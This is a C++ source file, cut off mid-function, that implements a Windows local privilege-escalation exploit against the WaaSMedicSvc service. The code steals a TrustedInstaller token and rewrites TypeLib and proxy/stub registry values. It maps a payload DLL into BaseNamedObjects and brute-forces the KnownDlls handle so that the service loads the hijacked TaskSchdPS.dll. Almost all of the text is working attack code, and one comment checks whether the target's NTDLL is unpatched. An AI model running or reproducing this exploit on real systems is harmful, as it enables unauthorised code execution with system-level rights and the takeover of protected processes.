#include "Exploit.h"
#include "Utils.h"
#include "WaaSMedicClient.h"
#include "globaldef.h"
#include "resource.h"
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

Exploit::Exploit()
{
    _BaseNamedObjectsHandle = 0;
    _KnownDllDirectoryHandleAddr = 0;
    _WaaSMedicSvcPid = 0;
    _WaaSMedicCapsuleHandle = INVALID_HANDLE_VALUE;
    _TiToken = NULL;
    _DllSectionHandle = NULL;
    _DummyDllFileHandle = NULL;
    _ProxyStubDllLoadEventHandle = NULL;
    _WaaSMedicCapsulePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _TypeLibPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _TypeLibOrigPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _TypeLibRegValuePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _ProxyStubOrigPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _ProxyStubRegValuePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _ProxyStubDllLoadEventName = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _HollowedDllPath = NULL;
    _HijackedDllName = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _HijackedDllSectionPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _StatePluginDllLocked = FALSE;
    _StateRegTypeLibModified = FALSE;
    _StateTypeLibCreated = FALSE;
    _StateRegProxyStubModified = FALSE;
}

Exploit::~Exploit()
{
    if (Utils::IsServiceRunning(STR_WAASMEDIC_SVC))
        Utils::StopServiceByName(STR_WAASMEDIC_SVC, TRUE);

    if (this->EnumerateTemporaryDirectories(&_TemporaryDiretoriesAfter))
        this->DeleteTemporaryDirectories();

    this->RestoreProxyStubRegistryValue();
    this->RestoreTypeLibRegistryValue();
    this->UnmapPayloadDll();
    this->UnlockPluginDll();
    this->DeleteTypeLib();

    Utils::SafeCloseHandle(&_TiToken);
    Utils::SafeCloseHandle(&_WaaSMedicCapsuleHandle);
    Utils::SafeCloseHandle(&_DummyDllFileHandle);
    Utils::SafeCloseHandle(&_ProxyStubDllLoadEventHandle);
    Utils::SafeFree((PVOID*)&_WaaSMedicCapsulePath);
    Utils::SafeFree((PVOID*)&_TypeLibPath);
    Utils::SafeFree((PVOID*)&_TypeLibOrigPath);
    Utils::SafeFree((PVOID*)&_TypeLibRegValuePath);
    Utils::SafeFree((PVOID*)&_ProxyStubOrigPath);
    Utils::SafeFree((PVOID*)&_ProxyStubRegValuePath);
    Utils::SafeFree((PVOID*)&_ProxyStubDllLoadEventName);
    Utils::SafeFree((PVOID*)&_HollowedDllPath);
    Utils::SafeFree((PVOID*)&_HijackedDllName);
    Utils::SafeFree((PVOID*)&_HijackedDllSectionPath);

    for (LPWSTR pwszEntry : _TemporaryDiretoriesBefore)
        Utils::SafeFree((PVOID*)&pwszEntry);
    for (LPWSTR pwszEntry : _TemporaryDiretoriesAfter)
        Utils::SafeFree((PVOID*)&pwszEntry);
}

BOOL Exploit::Run()
{
    BOOL bResult = FALSE;
    WaaSMedicClient* WaaSMedic = nullptr;
    DWORD i;

    if (!Utils::EnablePrivilege(SE_DEBUG_NAME))
    {
        ERROR(L"Failed to enable privilege %ws.", SE_DEBUG_NAME);
        goto cleanup;
    }

    //
    // If WaaSMedicSvc is running, stop it first and then start it. We want to make sure we are
    // working in a "clean" environment. This is important to ensure that TaskSchdPS.dll is not
    // already loaded.
    //

    EXIT_ON_ERROR(!this->RestartWaaSMedicSvc())
    INFO(L"Service (re)started: %ws", STR_WAASMEDIC_SVC);

    //
    // Determine the value of the \BaseNamedObjects directory handle in the WaaSMedic process.
    // This will help us choose the strategy to adopt for the memory write.
    //

    EXIT_ON_ERROR(!this->FindWaaSMedicSvcBaseNamedObjectsHandle());
    INFO("Directory handle value in remote process: 0x%04x", this->_BaseNamedObjectsHandle);

    //
    // Create the TypeLib file, and modify the registry as TrustedInstaller to replace the 
    // original TypeLib file path.
    //

    EXIT_ON_ERROR(!this->WriteTypeLib());
    EXIT_ON_ERROR(!this->ModifyTypeLibRegistryValue());
    INFO(L"TypeLib file created and set in the registry: %ws", this->GetTypeLibPath());

    //
    // Determine the address of the \KnownDlls directory handle. We need this information to
    // know where to write in the target process.
    //

    if (!Utils::GetKnownDllsHandleAddress(&this->_KnownDllDirectoryHandleAddr))
    {
        ERROR(L"Failed to determine the address of LdrpKnownDllDirectoryHandle");
        goto cleanup;
    }
    INFO(L"Known DLL Directory handle @ 0x%llx", (DWORD64)this->_KnownDllDirectoryHandleAddr);

    //
    // We will prepare the DLL hijacking of the 'TaskSchdPS.dll' DLL by 1. creating a section
    // in the object manager for our own DLL with a random name in the \BaseNamedObjects
    // directory, 2. modifying the registry to set this DLL as the Proxy Stub DLL for the
    // ITaskHandler interface.
    //

    EXIT_ON_ERROR(!this->MapPayloadDll());
    INFO(L"Section '%ws' created from file '%ws'", this->GetHijackedDllSectionPath(), this->_HollowedDllPath);
    EXIT_ON_ERROR(!this->CreateDummyDllFile());
    EXIT_ON_ERROR(!this->ModifyProxyStubRegistryValue());
    INFO(L"Proxy/Stub DLL path set in the registry: %ws", this->GetHijackedDllName());

    //
    // The methods LaunchDetectionOnly and LaunchRemediationOnly both call the internal function
    // LoadPluginLibrary, which ultimately calls the LoadLibrary(Ex) API. This API throws an
    // exception if the KnownDlls handle is invalid. By locking the target DLL file, we can
    // force the service to fail before calling LoadLibrary(Ex) and therefore avoid the crash.
    // Another benefit is that it drastically increases the speed of the exploit.
    //

    EXIT_ON_ERROR(!this->LockPluginDll());
    INFO(L"Plugin DLL file locked: %ws", this->GetWaaSMedicCapsulePath());

    //
    // Prepare synchronization. We create a global Event, and start a watcher thread that waits
    // for it to be signaled in a loop.
    //

    EXIT_ON_ERROR((this->_ProxyStubDllLoadEventHandle = CreateEventW(NULL, TRUE, FALSE, this->GetProxyStubDllLoadEventName())) == NULL);

    //
    // Here we start writing random handle values where the \KnownDlls hande is normally stored in
    // a loop. After each write, we attempt to create a remote TaskHandler object. When this object
    // is created, the TaskSchdPS.dll DLL is loaded. So, if the handle value is correct, our version
    // of TaskSchdPS.dll should be loaded (as a "Known DLL"). Otherwise, the handle is not valid and
    // we repeat the operation until we succeed or we reach the maximum number of attempts.
    //

    if (!this->EnumerateTemporaryDirectories(&_TemporaryDiretoriesBefore))
        WARNING(L"Failed to enumerate temporary directories.");

    WaaSMedic = new WaaSMedicClient(this->_KnownDllDirectoryHandleAddr, this->_BaseNamedObjectsHandle);

    EXIT_ON_ERROR(!WaaSMedic->WriteRemoteDllSearchPathFlag());
    SUCCESS(L"Remote DLL search path flag overwritten.");

    INFO(L"Trying to write a valid object directory handle...");

    for (i = 0; i < MAX_ATTEMPTS; i++)
    {
        if ((i + 1) % 100 == 0)
            INFO(L"Attempt %3d/%d (%d%%)", i + 1, MAX_ATTEMPTS, ((i + 1) * 100) / MAX_ATTEMPTS);

        EXIT_ON_ERROR(!WaaSMedic->WriteRemoteKnownDllHandle());

        if (!WaaSMedic->CreateTaskHandlerInstance())
        {
            if (!Utils::IsServiceRunning(STR_WAASMEDIC_SVC))
            {
                WARNING(L"Service %ws is no longer running, it probably crashed because of an invalid handle value.", STR_WAASMEDIC_SVC);
                goto cleanup;
            }
        }

        if (this->IsProxyStubDllLoaded())
        {
            SUCCESS(L"Payload DLL successfully loaded after %d attempts!", i + 1);
            bResult = TRUE;
            break;
        }
    }

    if (i >= MAX_ATTEMPTS)
    {
        ERROR(L"Reached the maximum number of attempts.");
    }

cleanup:
    this->RestoreProxyStubRegistryValue();
    this->RestoreTypeLibRegistryValue();

    if (this->EnumerateTemporaryDirectories(&_TemporaryDiretoriesAfter)) this->DeleteTemporaryDirectories();
    if (WaaSMedic) delete WaaSMedic;

    DEBUG(L"Result: %d", bResult);

    return bResult;
}

BOOL Exploit::Restore()
{
    BOOL bResult = FALSE, bImpersonated = FALSE;
    LPWSTR pwszProxyStubPath = NULL;

    EXIT_ON_ERROR(!(pwszProxyStubPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetSystemDirectoryW(pwszProxyStubPath, MAX_PATH));

    swprintf_s(pwszProxyStubPath, MAX_PATH, L"%ws\\%ws", pwszProxyStubPath, STR_TASKSCHD_TYPELIB_DEFAULT);

    EXIT_ON_ERROR(!this->ImpersonateTrustedInstaller());

    bImpersonated = TRUE;

    EXIT_ON_ERROR(!Utils::SetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetTypeLibRegValuePath(), NULL, STR_WAASMEDIC_TYPELIB_DEFAULT));
    EXIT_ON_ERROR(!Utils::SetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetProxyStubRegValuePath(), NULL, this->GetProxyStubOrigPath()));

    bResult = TRUE;

cleanup:
    if (bImpersonated) this->RevertToSelf();
    Utils::SafeFree((PVOID*)&pwszProxyStubPath);

    return bResult;
}

HANDLE Exploit::GetTiToken()
{
    if (!this->_TiToken)
        this->FindTrustedInstallerToken();

    return this->_TiToken;
}

DWORD Exploit::GetWaaSMedicSvcPid()
{
    if (!this->_WaaSMedicSvcPid)
        this->FindWaaSMedicSvcPid();

    return this->_WaaSMedicSvcPid;
}

LPWSTR Exploit::GetTypeLibPath()
{
    if (!wcslen(this->_TypeLibPath))
        Utils::GenerateTempPath(this->_TypeLibPath);

    return this->_TypeLibPath;
}

LPWSTR Exploit::GetTypeLibRegValuePath()
{
    if (!wcslen(this->_TypeLibRegValuePath))
        this->FindTypeLibRegistryValuePath();

    return this->_TypeLibRegValuePath;
}

LPWSTR Exploit::GetTypeLibOrigPath()
{
    LPWSTR pwszTypeLibPath = NULL;

    if (!wcslen(this->_TypeLibOrigPath))
    {
        if (Utils::GetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetTypeLibRegValuePath(), NULL, &pwszTypeLibPath))
        {
            swprintf_s(this->_TypeLibOrigPath, MAX_PATH, L"%ws", pwszTypeLibPath);

            if (pwszTypeLibPath)
                LocalFree(pwszTypeLibPath);
        }
    }    

    return this->_TypeLibOrigPath;
}

LPWSTR Exploit::GetWaaSMedicCapsulePath()
{

    if (!wcslen(this->_WaaSMedicCapsulePath))
        this->FindWaaSMedicCapsulePath();

    return this->_WaaSMedicCapsulePath;
}

LPWSTR Exploit::GetProxyStubRegValuePath()
{
    if (!wcslen(this->_ProxyStubRegValuePath))
        this->FindProxyStubRegistryValuePath();

    return this->_ProxyStubRegValuePath;
}

LPWSTR Exploit::GetProxyStubOrigPath()
{
    LPWSTR pwszProxyStubPath = NULL;

    if (!wcslen(this->_ProxyStubOrigPath))
    {
        if (Utils::GetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetProxyStubRegValuePath(), NULL, &pwszProxyStubPath))
        {
            swprintf_s(this->_ProxyStubOrigPath, MAX_PATH, L"%ws", pwszProxyStubPath);

            Utils::SafeFree((PVOID*)&pwszProxyStubPath);
        }
    }

    return this->_ProxyStubOrigPath;
}

LPWSTR Exploit::GetProxyStubDllLoadEventName()
{
    if (!wcslen(this->_ProxyStubDllLoadEventName))
    {
        swprintf_s(this->_ProxyStubDllLoadEventName, MAX_PATH, L"Global\\%ws", STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
    }

    return this->_ProxyStubDllLoadEventName;
}

LPWSTR Exploit::GetHijackedDllName()
{
    if (!wcslen(this->_HijackedDllName))
    {
        swprintf_s(this->_HijackedDllName, MAX_PATH, L"%ws", STR_HIJACKED_DLL_NAME);
    }

    return this->_HijackedDllName;
}

LPWSTR Exploit::GetHijackedDllSectionPath()
{
    if (!wcslen(this->_HijackedDllSectionPath))
    {
        swprintf_s(this->_HijackedDllSectionPath, MAX_PATH, L"\\%ws\\%ws", STR_BASENAMEDOBJECTS, this->GetHijackedDllName());
    }

    return this->_HijackedDllSectionPath;
}

BOOL Exploit::RestartWaaSMedicSvc()
{
    BOOL bResult = FALSE;
    DWORD dwWaaSMedicStatus;

    EXIT_ON_ERROR(!Utils::GetServiceStatusByName(STR_WAASMEDIC_SVC, &dwWaaSMedicStatus));

    if (dwWaaSMedicStatus == SERVICE_RUNNING)
    {
        INFO("%ws is running, stopping it...", STR_WAASMEDIC_SVC);
        EXIT_ON_ERROR(!Utils::StopServiceByName(STR_WAASMEDIC_SVC, TRUE));
    }

    INFO("Starting service %ws...", STR_WAASMEDIC_SVC);
    EXIT_ON_ERROR(!Utils::StartServiceByName(STR_WAASMEDIC_SVC, TRUE));

    bResult = TRUE;

cleanup:
    DEBUG(L"Result: %d", bResult);

    if (!bResult)
        ERROR(L"Failed to (re)start service %ws.", STR_WAASMEDIC_SVC);

    return bResult;
}

BOOL Exploit::FindWaaSMedicSvcPid()
{
    return Utils::GetServiceProcessId(STR_WAASMEDIC_SVC, &_WaaSMedicSvcPid);
}

BOOL Exploit::LockPluginDll()
{
    BOOL bResult = FALSE;

    if (!this->_StatePluginDllLocked)
    {
        EXIT_ON_ERROR((_WaaSMedicCapsuleHandle = CreateFileW(this->GetWaaSMedicCapsulePath(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE);
        EXIT_ON_ERROR(!LockFile(_WaaSMedicCapsuleHandle, 0, 0, 4096, 0));

        this->_StatePluginDllLocked = TRUE;
    }

    bResult = TRUE;

cleanup:
    DEBUG(L"Lock: %d | Result: %d", this->_StatePluginDllLocked, bResult);

    if (!bResult)
        ERROR(L"Failed to lock file: %ws", this->GetWaaSMedicCapsulePath());

    return bResult;
}

BOOL Exploit::UnlockPluginDll()
{
    BOOL bResult = FALSE;

    if (this->_StatePluginDllLocked)
    {
        EXIT_ON_ERROR(!UnlockFile(_WaaSMedicCapsuleHandle, 0, 0, 4096, 0));
        this->_StatePluginDllLocked = FALSE;
    }
    
    bResult = TRUE;

cleanup:
    DEBUG(L"Lock: %d | Result: %d", this->_StatePluginDllLocked, bResult);

    if (!bResult)
        ERROR(L"Failed to unlock file: %ws", this->GetWaaSMedicCapsulePath());

    return bResult;
}

BOOL Exploit::FindWaaSMedicSvcBaseNamedObjectsHandle()
{
    LPWSTR pwszFileVersion = NULL;

    if (!Utils::FindUniqueHandleValueByTypeName(this->GetWaaSMedicSvcPid(), L"Directory", &_BaseNamedObjectsHandle))
    {
        if (Utils::GetFileVersion(STR_MOD_NTDLL, &pwszFileVersion))
        {
            WARNING(L"NTDLL is probably not patched (current version: %ws)", pwszFileVersion);
            Utils::SafeFree((PVOID*)&pwszFileVersion);
        }
        else
        {
            WARNING(L"NTDLL is probably not patched.");
        }

        return FALSE;
    }

    return TRUE;
}

BOOL Exploit::FindTrustedInstallerToken()
{
    //
    // https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
    //

    BOOL bResult = FALSE, bImpersonation = FALSE;
    DWORD dwTiSvcStatus, dwTiSvcPid;
    HANDLE hSnapshot = INVALID_HANDLE_VALUE, hThread = NULL;
    THREADENTRY32 ThreadEntry;
    SECURITY_QUALITY_OF_SERVICE Qos;
    NTSTATUS status = STATUS_SUCCESS;

    EXIT_ON_ERROR(!Utils::EnablePrivilege(SE_DEBUG_NAME));
    EXIT_ON_ERROR(!Utils::EnablePrivilege(SE_IMPERSONATE_NAME));
    EXIT_ON_ERROR(!Utils::GetServiceStatusByName(STR_TI_SVC, &dwTiSvcStatus));

    if (dwTiSvcStatus != SERVICE_RUNNING)
    {
        INFO(L"Starting service %ws...", STR_TI_SVC);
        EXIT_ON_ERROR(!Utils::StartServiceByName(STR_TI_SVC, TRUE));
    }

    EXIT_ON_ERROR(!Utils::GetServiceProcessId(STR_TI_SVC, &dwTiSvcPid));
    EXIT_ON_ERROR((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE);

    ZeroMemory(&ThreadEntry, sizeof(ThreadEntry));
    ThreadEntry.dwSize = sizeof(ThreadEntry);

    EXIT_ON_ERROR(!Thread32First(hSnapshot, &ThreadEntry));

    do
    {
        if (ThreadEntry.th32OwnerProcessID == dwTiSvcPid)
        {
            if (hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, ThreadEntry.th32ThreadID))
                break;
        }

    } while (Thread32Next(hSnapshot, &ThreadEntry));

    ZeroMemory(&Qos, sizeof(Qos));
    Qos.Length = sizeof(Qos);
    Qos.ImpersonationLevel = SecurityImpersonation;

    EXIT_ON_ERROR(!NT_SUCCESS(status = NtImpersonateThread(GetCurrentThread(), hThread, &Qos)));

    bImpersonation = TRUE;

    EXIT_ON_ERROR(!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &_TiToken));

    bResult = TRUE;

cleanup:
    if (bImpersonation) RevertToSelf();
    Utils::SafeCloseHandle(&hThread);
    Utils::SafeCloseHandle(&hSnapshot);
    Utils::SetLastErrorFromNtStatus(status);

    DEBUG(L"Result: %d", bResult);

    return bResult;
}

BOOL Exploit::ImpersonateTrustedInstaller()
{
    BOOL bResult = FALSE;
    HANDLE hThread;

    hThread = GetCurrentThread();

    EXIT_ON_ERROR(!SetThreadToken(&hThread, this->GetTiToken()));

    bResult = TRUE;

cleanup:
    DEBUG(L"Result: %d", bResult);

    return bResult;
}

BOOL Exploit::RevertToSelf()
{
    BOOL bResult = ::RevertToSelf();

    DEBUG(L"Result: %d", bResult);

    return bResult;
}

BOOL Exploit::WriteTypeLib()
{
    BOOL bResult = FALSE;

    HRESULT hr = S_OK;
    UINT i, j, cNames;

    ITypeLib* TypeLibOrig = NULL;
    ITypeInfo* TypeInfoOrig = NULL;
    TLIBATTR* pTLibAttrOrig = NULL;
    TYPEATTR* pTypeAttrOrig = NULL;
    FUNCDESC* pFuncDescOrig = NULL;
    BSTR TypeLibName = NULL;

    ITypeLib* TypeLibRef = NULL;
    ITypeInfo* TypeInfoRef = NULL;
    HREFTYPE hRefType;
    BSTR Names[8];

    ICreateTypeLib2* TypeLibNew = NULL;
    ICreateTypeInfo* TypeInfoNew = NULL;
    ICreateTypeInfo* TypeInfoNew2 = NULL;
    ELEMDESC ldoParams[2];
    ELEMDESC lroParams[3];

    DEBUG(L"TypeLib file: %ws", this->GetTypeLibPath());
    
    EXIT_ON_ERROR(FAILED(hr = LoadTypeLib(STR_WAASMEDIC_TYPELIB, &TypeLibOrig))); // Load the original TypeLib
    EXIT_ON_ERROR(FAILED(hr = TypeLibOrig->GetLibAttr(&pTLibAttrOrig))); // Get attributes of the original TypeLib
    EXIT_ON_ERROR(FAILED(hr = CreateTypeLib2(pTLibAttrOrig->syskind, this->GetTypeLibPath(), &TypeLibNew))); // Create a new TypeLib

    TypeLibNew->SetGuid(pTLibAttrOrig->guid);
    TypeLibNew->SetLcid(pTLibAttrOrig->lcid);
    TypeLibNew->SetVersion(pTLibAttrOrig->wMajorVerNum, pTLibAttrOrig->wMinorVerNum);

    //
    // BEGIN: Write the IWaaSRemediationEx interface
    //

    EXIT_ON_ERROR(FAILED(hr = TypeLibOrig->GetTypeInfoOfGuid(IID_WAASREMEDIATIONEX, &TypeInfoOrig))); // Get info about IWaaSRemediationEx interface
    EXIT_ON_ERROR(FAILED(hr = TypeInfoOrig->GetTypeAttr(&pTypeAttrOrig))); // Get interface content
    EXIT_ON_ERROR(FAILED(hr = TypeInfoOrig->GetDocumentation(MEMBERID_NIL, &TypeLibName, NULL, NULL, NULL))); // Get TypeLib name
    EXIT_ON_ERROR(FAILED(hr = TypeLibNew->CreateTypeInfo(TypeLibName, TKIND_INTERFACE, &TypeInfoNew))); // Type: "dispatch" to "interface"

    TypeInfoNew->SetTypeFlags(TYPEFLAG_FHIDDEN | TYPEFLAG_FDUAL | TYPEFLAG_FNONEXTENSIBLE | TYPEFLAG_FOLEAUTOMATION);
    TypeInfoNew->SetGuid(pTypeAttrOrig->guid);
    TypeInfoNew->SetVersion(pTypeAttrOrig->wMajorVerNum, pTypeAttrOrig->wMinorVerNum);

    // Add references to implemented interfaces
    for (i = 0; i < pTypeAttrOrig->cImplTypes; i++)
    {
        if (FAILED(hr = TypeInfoOrig->GetRefTypeOfImplType(i, &hRefType)))
            continue;

        if (FAILED(hr = TypeInfoOrig->GetRefTypeInfo(hRefType, &TypeInfoRef)))
            continue;

        TypeInfoNew->AddRefTypeInfo(TypeInfoRef, &hRefType);
        TypeInfoNew->AddImplType(i, hRefType);

        Utils::SafeRelease((IUnknown**)&TypeInfoRef);
    }

    //
    // Get the description of each function, modify them and add them to the new TypeLib.
    // See https://thrysoee.dk/InsideCOM+/ch09b.htm
    //

    for (i = 0; i < pTypeAttrOrig->cFuncs; i++)
    {
        if (FAILED(hr = TypeInfoOrig->GetFuncDesc(i, &pFuncDescOrig)))
            continue;

        if (pFuncDescOrig->memid != 0x60020000 && pFuncDescOrig->memid != 0x60020001)
        {
            TypeInfoOrig->ReleaseFuncDesc(pFuncDescOrig);
            continue;
        }

        if (FAILED(hr = TypeInfoOrig->GetNames(pFuncDescOrig->memid, Names, sizeof(Names) / sizeof(*Names), &cNames)))
        {
            TypeInfoOrig->ReleaseFuncDesc(pFuncDescOrig);
            continue;
        }

        if (pFuncDescOrig->memid == 0x60020000)
        {
            // LaunchDetectionOnly

            ldoParams[0].tdesc.vt = VT_BSTR;
            ldoParams[0].paramdesc.wParamFlags = PARAMFLAG_FIN;
            ldoParams[1].tdesc.vt = VT_UI8;
            ldoParams[1].paramdesc.wParamFlags = PARAMFLAG_FIN;

            pFuncDescOrig->lprgelemdescParam = ldoParams;
        }
        else if (pFuncDescOrig->memid == 0x60020001)
        {
            // LaunchRemediationOnly

            lroParams[0].tdesc.vt = VT_BSTR;
            lroParams[0].paramdesc.wParamFlags = PARAMFLAG_FIN;
            lroParams[1].tdesc.vt = VT_BSTR;
            lroParams[1].paramdesc.wParamFlags = PARAMFLAG_FIN;
            lroParams[2].tdesc.vt = VT_UI8;
            lroParams[2].paramdesc.wParamFlags = PARAMFLAG_FIN;

            pFuncDescOrig->lprgelemdescParam = lroParams;
        }

        pFuncDescOrig->cParams += 1;
        Names[pFuncDescOrig->cParams] = SysAllocString(L"unknown");
        cNames += 1;

        pFuncDescOrig->funckind = FUNC_PUREVIRTUAL; // Change function type from "dispatch" to "pure virtual"
        pFuncDescOrig->elemdescFunc.tdesc.vt = VT_HRESULT; // Set return type to HRESULT
        hr = TypeInfoNew->AddFuncDesc(0, pFuncDescOrig); // Add function description to the interface
        hr = TypeInfoNew->SetFuncAndParamNames(0, Names, cNames); // Set function and parameter names

        for (j = 0; j < cNames; j++)
        {
            SysFreeString(Names[j]); // Free the strings returned by "GetNames"
        }

        TypeInfoOrig->ReleaseFuncDesc(pFuncDescOrig);
    }

    //
    // END: Write the IWaaSRemediationEx interface
    //

    if (pTypeAttrOrig)
        TypeInfoOrig->ReleaseTypeAttr(pTypeAttrOrig);
    Utils::SafeRelease((IUnknown**)&TypeInfoOrig);

    //
    // BEGIN: Write the ITaskHandler interface
    //

    EXIT_ON_ERROR(FAILED(hr = TypeLibOrig->GetTypeInfoOfGuid(IID_TASKHANDLER, &TypeInfoOrig))); // Get info about ITaskHandler interface
    EXIT_ON_ERROR(FAILED(hr = TypeInfoOrig->GetTypeAttr(&pTypeAttrOrig))); // Get interface content
    EXIT_ON_ERROR(FAILED(hr = TypeInfoOrig->GetDocumentation(MEMBERID_NIL, &TypeLibName, NULL, NULL, NULL))); // Get TypeLib name
    EXIT_ON_ERROR(FAILED(hr = TypeLibNew->CreateTypeInfo(TypeLibName, TKIND_INTERFACE, &TypeInfoNew2))); // Type: "dispatch" to "interface"

    TypeInfoNew2->SetTypeFlags(TYPEFLAG_FHIDDEN | TYPEFLAG_FNONEXTENSIBLE | TYPEFLAG_FOLEAUTOMATION);
    TypeInfoNew2->SetGuid(pTypeAttrOrig->guid);
    TypeInfoNew2->SetVersion(pTypeAttrOrig->wMajorVerNum, pTypeAttrOrig->wMinorVerNum);

    // Add references to implemented interfaces
    for (i = 0; i < pTypeAttrOrig->cImplTypes; i++)
    {
        if (FAILED(hr = TypeInfoOrig->GetRefTypeOfImplType(i, &hRefType)))
            continue;

        if (FAILED(hr = TypeInfoOrig->GetRefTypeInfo(hRefType, &TypeInfoRef)))
            continue;

        TypeInfoNew2->AddRefTypeInfo(TypeInfoRef, &hRefType);
        TypeInfoNew2->AddImplType(i, hRefType);

        Utils::SafeRelease((IUnknown**)&TypeInfoRef);
    }

    for (i = 0; i < pTypeAttrOrig->cFuncs; i++)
    {
        if (FAILED(hr = TypeInfoOrig->GetFuncDesc(i, &pFuncDescOrig)))
            continue;

        if (FAILED(hr = TypeInfoOrig->GetNames(pFuncDescOrig->memid, Names, sizeof(Names) / sizeof(*Names), &cNames)))
        {
            TypeInfoOrig->ReleaseFuncDesc(pFuncDescOrig);
            continue;
        }

        hr = TypeInfoNew2->AddFuncDesc(0, pFuncDescOrig); // Add function description to the interface
        hr = TypeInfoNew2->SetFuncAndParamNames(0, Names, cNames); // Set function and parameter names

        for (j = 0; j < cNames; j++)
        {   
            SysFreeString(Names[j]); // Free the strings returned by "GetNames"
        }

        TypeInfoOrig->ReleaseFuncDesc(pFuncDescOrig);
    }

    //
    // END: Write the ITaskHandler interface
    //

    if (SUCCEEDED(hr = TypeLibNew->SaveAllChanges()))
    {
        this->_StateTypeLibCreated = TRUE;
        bResult = TRUE;
    }

cleanup:
    Utils::SafeRelease((IUnknown**)&TypeInfoRef);
    Utils::SafeRelease((IUnknown**)&TypeLibRef);
    Utils::SafeRelease((IUnknown**)&TypeInfoNew);
    if (TypeLibName) SysFreeString(TypeLibName);
    if (pTypeAttrOrig) TypeInfoOrig->ReleaseTypeAttr(pTypeAttrOrig);
    Utils::SafeRelease((IUnknown**)&TypeInfoOrig);
    Utils::SafeRelease((IUnknown**)&TypeLibNew);
    if (pTLibAttrOrig) TypeLibOrig->ReleaseTLibAttr(pTLibAttrOrig);
    Utils::SafeRelease((IUnknown**)&TypeLibOrig);

    DEBUG(L"TypeLib: %ws | HRESULT: 0x%08x | Result: %d", this->GetTypeLibPath(), bResult, hr);

    if (!bResult)
        ERROR(L"Failed to write TypeLib to file: %ws", this->GetTypeLibPath());

    return bResult;
}

BOOL Exploit::DeleteTypeLib()
{
    BOOL bResult = FALSE;

    if (this->_StateTypeLibCreated)
    {
        EXIT_ON_ERROR(!DeleteFileW(this->_TypeLibPath));
        this->_StateTypeLibCreated = FALSE;
    }

    bResult = TRUE;

cleanup:
    DEBUG(L"Result: %d", bResult);

    if (!bResult)
        ERROR(L"Failed to delete custom TypeLib file: %ws", this->_TypeLibPath);

    return bResult;
}

BOOL Exploit::FindTypeLibRegistryValuePath()
{
    BOOL bResult = FALSE;
    LPWSTR pwszRegPath = NULL, pwszTypeLibGuid = NULL;
    RPC_WSTR InterfaceGuidStr = NULL;
    UUID InterfaceGuid;

    //
    // HKLM\SOFTWARE\Classes\Interface\{B4C1D279-966E-44E9-A9C5-CCAF4A77023D}\TypeLib
    //      (Default) -> {3ff1aab8-f3d8-11d4-825d-00104b3646c0}
    // HKLM\SOFTWARE\Classes\TypeLib\{3ff1aab8-f3d8-11d4-825d-00104b3646c0}\1.0\0\Win64
    //      (Default) -> %SystemRoot%\system32\WaaSMedicPS.dll
    //

    InterfaceGuid = IID_WAASREMEDIATIONEX;

    EXIT_ON_ERROR(!(pwszRegPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(UuidToStringW(&InterfaceGuid, &InterfaceGuidStr) != RPC_S_OK);

    swprintf_s(pwszRegPath, MAX_PATH, L"SOFTWARE\\Classes\\Interface\\{%ws}\\TypeLib", (LPWSTR)InterfaceGuidStr);

    EXIT_ON_ERROR(!Utils::GetRegistryStringValue(HKEY_LOCAL_MACHINE, pwszRegPath, NULL, &pwszTypeLibGuid));

    swprintf_s(this->_TypeLibRegValuePath, MAX_PATH, L"SOFTWARE\\Classes\\TypeLib\\%ws\\1.0\\0\\Win64", pwszTypeLibGuid);

    bResult = TRUE;

cleanup:
    if (InterfaceGuidStr) RpcStringFreeW(&InterfaceGuidStr);
    Utils::SafeFree((PVOID*)&pwszTypeLibGuid);
    Utils::SafeFree((PVOID*)&pwszRegPath);

    DEBUG(L"Path: %ws | Result: %d", this->_TypeLibRegValuePath, bResult);

    return bResult;
}

BOOL Exploit::ModifyTypeLibRegistryValue()
{
    BOOL bResult = FALSE;
    BOOL bImpersonated = FALSE;

    EXIT_ON_ERROR(!this->GetTypeLibOrigPath()); // Make sure we retrieve the original path before modifying it
    EXIT_ON_ERROR(!this->ImpersonateTrustedInstaller());

    bImpersonated = TRUE;

    EXIT_ON_ERROR(!Utils::SetRegistryStringValue(HKEY_LOCAL_MACHINE, this->GetTypeLibRegValuePath(), NULL, this->GetTypeLibPath()));

    this->_StateRegTypeLibModified = TRUE;
    bResult = TRUE;

cleanup:
    if (bImpersonated) this->RevertToSelf();

    DEBUG(L"Result: %d", bResult);

    if (!bResult)
        ERROR(L"Failed to modify registry key: %ws", this->GetTypeLibRegValuePath());

    return bResult;
}

BOOL Exploit::RestoreTypeLibRegistryValue()
{
    BOOL bResult = FALSE;
    BOOL bImpersonated = FALSE;

    if (this->_StateRegTypeLibModified)
    {
        EXIT_ON_ERROR(!this->ImpersonateTrustedInstaller());
        bImpersonated = TRUE;
